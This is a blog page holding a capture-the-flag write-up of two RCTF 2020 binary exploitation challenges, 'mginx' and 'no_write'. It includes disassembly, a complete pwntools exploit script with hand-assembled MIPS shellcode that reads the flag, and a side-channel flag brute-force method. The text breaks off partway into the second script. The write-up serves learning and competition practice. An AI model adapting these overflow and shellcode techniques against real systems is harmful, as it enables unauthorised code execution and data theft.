@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="referrer" content="no-referrer" />
+    <meta name="description" content="都快忘记自己的Blog了被迫做学校各种傻傻滴作业，第一天下午和最后一天凌晨抽时间看了两个题，不是很难，思路上都比较简单(没有看其他题目，不过这两个题卡在远程的时间比做题的时间都长，论sleep和recv的重要性) 0x01 mgnix一血，Happy 123456789$ checksec .&#x2F;mginx [!] Did not find any GOT entries[*] &#39;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCTF 2020 mginx &amp;&amp; no_write">
+<meta property="og:url" content="http://yoursite.com/2020/06/01/RCTF-2020-mginx-no-write/index.html">
+<meta property="og:site_name" content="Kirin&#39;s Blog">
+<meta property="og:description" content="都快忘记自己的Blog了被迫做学校各种傻傻滴作业，第一天下午和最后一天凌晨抽时间看了两个题，不是很难，思路上都比较简单(没有看其他题目，不过这两个题卡在远程的时间比做题的时间都长，论sleep和recv的重要性) 0x01 mgnix一血，Happy 123456789$ checksec .&#x2F;mginx [!] Did not find any GOT entries[*] &#39;">
+<meta property="article:published_time" content="2020-06-01T06:52:28.000Z">
+<meta property="article:modified_time" content="2020-06-01T06:53:07.546Z">
+<meta property="article:author" content="Kirin">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>RCTF 2020 mginx &amp;&amp; no_write</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/03/10/Kernoob-kmalloc-without-SMAP/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/06/01/RCTF-2020-mginx-no-write/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/06/01/RCTF-2020-mginx-no-write/&text=RCTF 2020 mginx &amp;&amp; no_write" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/06/01/RCTF-2020-mginx-no-write/&title=RCTF 2020 mginx &amp;&amp; no_write" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/06/01/RCTF-2020-mginx-no-write/&is_video=false&description=RCTF 2020 mginx &amp;&amp; no_write" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RCTF 2020 mginx &amp;&amp; no_write&body=Check out this article: http://yoursite.com/2020/06/01/RCTF-2020-mginx-no-write/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/06/01/RCTF-2020-mginx-no-write/&title=RCTF 2020 mginx &amp;&amp; no_write" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/06/01/RCTF-2020-mginx-no-write/&title=RCTF 2020 mginx &amp;&amp; no_write" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/06/01/RCTF-2020-mginx-no-write/&title=RCTF 2020 mginx &amp;&amp; no_write" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/06/01/RCTF-2020-mginx-no-write/&title=RCTF 2020 mginx &amp;&amp; no_write" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/06/01/RCTF-2020-mginx-no-write/&name=RCTF 2020 mginx &amp;&amp; no_write&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-mgnix"><span class="toc-number">1.</span> <span class="toc-text">0x01 mgnix</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-no-write"><span class="toc-number">2.</span> <span class="toc-text">0x02 no write</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        RCTF 2020 mginx &amp;&amp; no_write
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Kirin's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2020-06-01T06:52:28.000Z" itemprop="datePublished">2020-06-01</time>
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>都快忘记自己的Blog了<br>被迫做学校各种傻傻滴作业，第一天下午和最后一天凌晨抽时间看了两个题，不是很难，思路上都比较简单(没有看其他题目，不过这两个题卡在远程的时间比做题的时间都长，论sleep和recv的重要性)</p>
+<h3 id="0x01-mgnix"><a href="#0x01-mgnix" class="headerlink" title="0x01 mgnix"></a>0x01 mgnix</h3><p><strong>一血，Happy</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ checksec .&#x2F;mginx </span><br><span class="line">[!] Did not find any GOT entries</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;kirin&#x2F;xctf&#x2F;mnigx&#x2F;mginx&#39;</span><br><span class="line">    Arch:     mips64-64-big</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x120000000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+<p>mips pwn<br>是自己实现的一个简单的HTTP解析程序<br>程序在根据Content-Length计算第二次需要read的数据长度时存在逻辑问题，并且直接从第一次read的HTTP头结尾开始read，从而可以造成栈溢出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000120001B00 dli $v0, 0x120000000 # Doubleword Load Immediate</span><br><span class="line">.text:0000000120001B04 daddiu $a1, $v0, (asc_1200021E0 - 0x120000000) # &quot;\r\n\r\n&quot;</span><br><span class="line">.text:0000000120001B08 ld $a0, 0x10C0+haystack($fp) # haystack</span><br><span class="line">.text:0000000120001B0C dla $v0, strstr # Load 64-bit address</span><br><span class="line">.text:0000000120001B10 move $t9, $v0</span><br><span class="line">.text:0000000120001B14 jalr $t9 ; strstr # Jump And Link Register</span><br><span class="line">.text:0000000120001B18 nop</span><br><span class="line">.text:0000000120001B1C sd $v0, 0x10C0+var_10A0($fp) # Store Doubleword</span><br><span class="line">.text:0000000120001B20 ld $v0, 0x10C0+var_10A0($fp) # Load Doubleword</span><br><span class="line">.text:0000000120001B24 beqz $v0, loc_120001C70 # Branch on Zero</span><br><span class="line">.text:0000000120001B28 nop</span><br><span class="line">.text:0000000120001B2C ld $v0, 0x10C0+var_10A0($fp) # Load Doubleword</span><br><span class="line">.text:0000000120001B30 daddiu $v0, 4 # Doubleword Add Immediate Unsigned</span><br><span class="line">.text:0000000120001B34 sd $v0, 0x10C0+var_10A0($fp) # Store Doubleword</span><br><span class="line">.text:0000000120001B38 ld $v0, 0x10C0+var_10A0($fp) # Load Doubleword</span><br><span class="line">.text:0000000120001B3C sd $v0, 0x10C0+var_1070($fp) # Store Doubleword</span><br><span class="line">.text:0000000120001B40 lw $v1, 0x10C0+var_10A8($fp) # Load Word</span><br><span class="line">.text:0000000120001B44 daddiu $a0, $fp, 0x10C0+var_1038 # Doubleword Add Immediate Unsigned</span><br><span class="line">.text:0000000120001B48 ld $v0, 0x10C0+var_10A0($fp) # Load Doubleword</span><br><span class="line">.text:0000000120001B4C dsubu $v0, $a0 # Doubleword Subtract Unsigned</span><br><span class="line">.text:0000000120001B50 sll $v0, 0 # Shift Left Logical</span><br><span class="line">.text:0000000120001B54 subu $v0, $v1, $v0 # Subtract Unsigned</span><br><span class="line">.text:0000000120001B58 move $v1, $v0</span><br><span class="line">.text:0000000120001B5C lw $v0, 0x10C0+var_1068($fp) # Load Word</span><br><span class="line">.text:0000000120001B60 addu $v0, $v1, $v0 # Add Unsigned</span><br><span class="line">.text:0000000120001B64 sw $v0, 0x10C0+var_10B8($fp) # Store Word</span><br><span class="line">.text:0000000120001B68 daddiu $v1, $fp, 0x10C0+var_1038 # Doubleword Add Immediate Unsigned</span><br><span class="line">.text:0000000120001B6C lw $v0, 0x10C0+var_10A8($fp) # Load Word</span><br><span class="line">.text:0000000120001B70 daddu $v0, $v1, $v0 # Doubleword Add Unsigned</span><br><span class="line">.text:0000000120001B74 sd $v0, 0x10C0+buf($fp) # Store Doubleword</span><br><span class="line">.text:0000000120001B78 b loc_120001BD0 # Branch Always</span><br><span class="line">.text:0000000120001B7C nop</span><br><span class="line">.text:0000000120001B80 # ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000120001B80</span><br><span class="line">.text:0000000120001B80 loc_120001B80: # CODE XREF: main+4A0↓j</span><br><span class="line">.text:0000000120001B80 lw $v0, 0x10C0+var_10B8($fp) # Load Word</span><br><span class="line">.text:0000000120001B84 move $a2, $v0 # nbytes</span><br><span class="line">.text:0000000120001B88 ld $a1, 0x10C0+buf($fp) # buf</span><br><span class="line">.text:0000000120001B8C move $a0, $zero # fd</span><br><span class="line">.text:0000000120001B90 dla $v0, read # Load 64-bit address</span><br><span class="line">.text:0000000120001B94 move $t9, $v0</span><br><span class="line">.text:0000000120001B98 jalr $t9 ; read # Jump And Link Register</span><br><span class="line">.text:0000000120001B9C nop</span><br><span class="line">.text:0000000120001BA0 sw $v0, 0x10C0+var_1094($fp) # Store Word</span><br><span class="line">.text:0000000120001BA4 lw $v0, 0x10C0+var_1094($fp) # Load Word</span><br><span class="line">.text:0000000120001BA8 blez $v0, loc_120001BE4 # Branch on Less Than or Equal to Zero</span><br><span class="line">.text:0000000120001BAC nop</span><br><span class="line">.text:0000000120001BB0 lw $v0, 0x10C0+var_10B8($fp) # Load Word</span><br><span class="line">.text:0000000120001BB4 ld $v1, 0x10C0+buf($fp) # Load Doubleword</span><br><span class="line">.text:0000000120001BB8 daddu $v0, $v1, $v0 # Doubleword Add Unsigned</span><br><span class="line">.text:0000000120001BBC sd $v0, 0x10C0+buf($fp) # Store Doubleword</span><br><span class="line">.text:0000000120001BC0 lw $v1, 0x10C0+var_10B8($fp) # Load Word</span><br><span class="line">.text:0000000120001BC4 lw $v0, 0x10C0+var_1094($fp) # Load Word</span><br><span class="line">.text:0000000120001BC8 subu $v0, $v1, $v0 # Subtract Unsigned</span><br><span class="line">.text:0000000120001BCC sw $v0, 0x10C0+var_10B8($fp) # Store Word</span><br><span class="line">.text:0000000120001BD0</span><br><span class="line">.text:0000000120001BD0 loc_120001BD0: # CODE XREF: main+444↑j</span><br><span class="line">.text:0000000120001BD0 lw $v0, 0x10C0+var_10B8($fp) # Load Word</span><br><span class="line">.text:0000000120001BD4 bnez $v0, loc_120001B80 # Branch on Not Zero</span><br><span class="line">.text:0000000120001BD8 nop</span><br><span class="line">.text:0000000120001BDC b loc_120001BE8 # Branch Always</span><br><span class="line">.text:0000000120001BE0 nop</span><br></pre></td></tr></table></figure>
+<p>类似这样的payload就可以：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;GET &#x2F;flag \r\n</span><br><span class="line">Connection: keep-alie\r\n</span><br><span class="line">Content-Length: 1000\r\n</span><br><span class="line">\r\n</span><br><span class="line">&quot;a&quot;*0x9b0</span><br></pre></td></tr></table></figure>
+<p>栈溢出后程序没有开启NX保护，但是mips没有类似jmp rsp的操作<br>考虑先迁移栈到data段，而后再次栈溢出即可(迁移时注意为了防止crash，直接从main函数第一次read时复用即可)<br>(这里orw的shellcode，赛时没找到合适的as，为了赶时间，直接对照题目的elf文件中汇编到机器码的规则，以及题目uclibc中特定函数的syscall参数，人工翻译出来的orz)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level&#x3D;&quot;debug&quot;</span><br><span class="line">context.endian&#x3D;&quot;big&quot;</span><br><span class="line">if len(sys.argv)&#x3D;&#x3D;1:</span><br><span class="line">   p&#x3D;process([&quot;qemu-mips64&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;-L&quot;,&quot;.&#x2F;&quot;,&quot;.&#x2F;mginx&quot;])</span><br><span class="line">   time.sleep(3)</span><br><span class="line">elif len(sys.argv)&#x3D;&#x3D;2:</span><br><span class="line">   p&#x3D;process([&quot;qemu-mips64&quot;,&quot;-L&quot;,&quot;.&#x2F;&quot;,&quot;.&#x2F;mginx&quot;])  </span><br><span class="line">else:</span><br><span class="line">  p&#x3D;remote(&quot;124.156.129.96&quot;,8888)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1&#x3D;&quot;GET &#x2F;flag \r\nConnection: keep-alie\r\nContent-Length: 1000\r\n\r\n&quot;+&quot;a&quot;*0x9b1</span><br><span class="line">#payload1&#x3D;payload1.ljust(0x1000,&quot;a&quot;)</span><br><span class="line">p.send(payload1)</span><br><span class="line">ra&#x3D;0x1200018C4</span><br><span class="line">fp&#x3D;0x120012540</span><br><span class="line">gp&#x3D;0x12001a250</span><br><span class="line">payload&#x3D;&quot;b&quot;*(0x654-0x20)+p64(gp)+p64(fp)+p64(ra)+&quot;d&quot;*8</span><br><span class="line">payload&#x3D;payload.ljust(0xd98,&quot;b&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">#p.interactive()</span><br><span class="line">p.recvuntil(&quot;404 Not Found :(&quot;)</span><br><span class="line">#time.sleep(2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">ra&#x3D;0x120013608</span><br><span class="line">#open</span><br><span class="line">shellcode&#x3D;&quot;\xc8\xff\xa4\x67&quot;[::-1]</span><br><span class="line">shellcode+&#x3D;&quot;\xff\xff\x05\x28&quot;[::-1]</span><br><span class="line">shellcode+&#x3D;&quot;\xff\xff\x06\x28&quot;[::-1]</span><br><span class="line">shellcode+&#x3D;&quot;\x8a\x13\x02\x24&quot;[::-1]</span><br><span class="line">shellcode+&#x3D;&quot;\x0c\x00\x00\x00&quot;[::-1]</span><br><span class="line">#read</span><br><span class="line">shellcode+&#x3D;&quot;\x00\x40\x20\x25&quot;#a0</span><br><span class="line">shellcode+&#x3D;&quot;\xc0\xff\xa5\x67&quot;[::-1]#buf</span><br><span class="line">shellcode+&#x3D;&quot;\x24\x06\x00\x28&quot;#size</span><br><span class="line">shellcode+&#x3D;&quot;\x88\x13\x02\x24&quot;[::-1]</span><br><span class="line">shellcode+&#x3D;&quot;\x0c\x00\x00\x00&quot;[::-1]</span><br><span class="line">#write</span><br><span class="line">shellcode+&#x3D;&quot;\x24\x04\x00\x01&quot;#a0</span><br><span class="line">shellcode+&#x3D;&quot;\xc0\xff\xa5\x67&quot;[::-1]#buf</span><br><span class="line">shellcode+&#x3D;&quot;\x24\x06\x00\x28&quot;#size</span><br><span class="line">shellcode+&#x3D;&quot;\x89\x13\x02\x24&quot;[::-1]</span><br><span class="line">shellcode+&#x3D;&quot;\x0c\x00\x00\x00&quot;[::-1]</span><br><span class="line">f&#x3D;&quot;&#x2F;flag&quot;</span><br><span class="line">payload&#x3D;&quot;b&quot;*(0x653-0x40)+f+&quot;\x00&quot;*(0x28-len(f))+p64(fp)+p64(ra)+&quot;d&quot;*8+shellcode+&quot;a&quot;*(0xd99-0x654-len(shellcode))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-no-write"><a href="#0x02-no-write" class="headerlink" title="0x02 no write"></a>0x02 no write</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec .&#x2F;no_write </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;kirin&#x2F;xctf&#x2F;no_write&#x2F;no_write&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>程序用prctl开启了沙箱，沙箱规则：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ seccomp-tools  dump .&#x2F;no_write </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  if (A !&#x3D; ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class="line"> 0003: 0x35 0x06 0x00 0x40000000  if (A &gt;&#x3D; 0x40000000) goto 0010</span><br><span class="line"> 0004: 0x15 0x04 0x00 0x00000002  if (A &#x3D;&#x3D; open) goto 0009</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  if (A &#x3D;&#x3D; read) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x0000003c  if (A &#x3D;&#x3D; exit) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x000000e7  if (A &#x3D;&#x3D; exit_group) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
+<p>只能进行open read 和exit<br>因为没有leak，所以首先要做的就是栈迁移，直接通过连续复用leave ret语句即可<br>因为这里没有syscall，所以想办法在栈中留下一个syscall<br>观察发现迁移栈后rcx=libc中read地址附近一个地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000011007F syscall ; LINUX - sys_read</span><br><span class="line">.text:0000000000110081 cmp rax, 0FFFFFFFFFFFFF000h</span><br><span class="line">.text:0000000000110087 ja short loc_1100E0</span><br><span class="line">.text:0000000000110089 rep retn</span><br><span class="line">.text:0000000000110090 loc_110090: ; CODE XREF: read+B↑j</span><br><span class="line">.text:0000000000110090 push r12</span><br><span class="line">.text:0000000000110092 push rbp</span><br><span class="line">.text:0000000000110093 mov r12, rdx</span><br><span class="line">.text:0000000000110096 push rbx</span><br><span class="line">.text:0000000000110097 mov rbp, rsi</span><br><span class="line">.text:000000000011009A mov ebx, edi</span><br><span class="line">.text:000000000011009C sub rsp, 10h</span><br><span class="line">.text:00000000001100A0 call sub_1306E0</span><br><span class="line">.text:00000000001100A5 mov rdx, r12 ; count</span><br><span class="line">.text:00000000001100A8 mov r8d, eax</span><br><span class="line">.text:00000000001100AB mov rsi, rbp ; buf</span><br><span class="line">.text:00000000001100AE mov edi, ebx ; fd</span><br><span class="line">.text:00000000001100B0 xor eax, eax</span><br><span class="line">.text:00000000001100B2 syscall</span><br></pre></td></tr></table></figure>
+<p>偏移：0x110081位置<br>附近恰好有syscall地址，所以想到直接利用调用start中的libc_start_main来在栈中构造syscall地址<br>简单说明一下：libc_start_main逻辑：在重新执行0x110081位置后，会直接ret入libc_start_main指定的”main函数”地址，这时候rbp=rcx，push入栈<br>在栈中留下一个syscall附近地址后(read附近的syscall可以顺利ret，没有crash)，只需要多次写，构造一条rop链，并修改地址低字节，就可以实现open(“./flag”);read(fd,flag_addr,len);<br>flag读入data段后，因为没有输出，所以要选择一条已知地址的cmp语句来实现判断，一一看过之后最后选择：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400750 loc_400750:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000400750                 mov     rdx, r15</span><br><span class="line">.text:0000000000400753                 mov     rsi, r14</span><br><span class="line">.text:0000000000400756                 mov     edi, r13d</span><br><span class="line">.text:0000000000400759                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040075D                 add     rbx, 1</span><br><span class="line">.text:0000000000400761                 cmp     rbp, rbx</span><br><span class="line">.text:0000000000400764                 jnz     short loc_400750</span><br><span class="line">.text:0000000000400766</span><br><span class="line">.text:0000000000400766 loc_400766:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400766                 add     rsp, 8</span><br><span class="line">.text:000000000040076A                 pop     rbx</span><br><span class="line">.text:000000000040076B                 pop     rbp</span><br><span class="line">.text:000000000040076C                 pop     r12</span><br><span class="line">.text:000000000040076E                 pop     r13</span><br><span class="line">.text:0000000000400770                 pop     r14</span><br><span class="line">.text:0000000000400772                 pop     r15</span><br><span class="line">.text:0000000000400774                 retn</span><br></pre></td></tr></table></figure>
+<p>只需让flag放在合适位置，在调用.text:0000000000400766时候就可以让flag其中一位pop入寄存器，而后再ret入0x400761这个位置，两个思路：</p>
+<ul>
+<li>直接通过比较rbp和rbx的值判断flag：rbx是flag其中一位(其他位覆盖为00字节就可以实现一位一位pop)，而后设置rbp为猜测值，这样只有相等时，才会继续走下面的ret，在ret位置放置read，就可以通过判断是否阻塞来爆破每一位</li>
+<li>第二种类似：控制r12，rbp=0，这样总会走jnz程序流，这时候rbx为特定值，通过不断修改r12，当r12+rbx*8位置处为read时发生阻塞，只需要在特定位置放置一个可以read的地址，r12从大到小，当第一次发生read阻塞时，r12+rbx*8就是已知的一个地址，r12已知，直接可以计算出rbx<br>赛时赶时间没写好完全的多线程脚本，通过修改current值(flag字符的index)，一位一位爆破即可：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 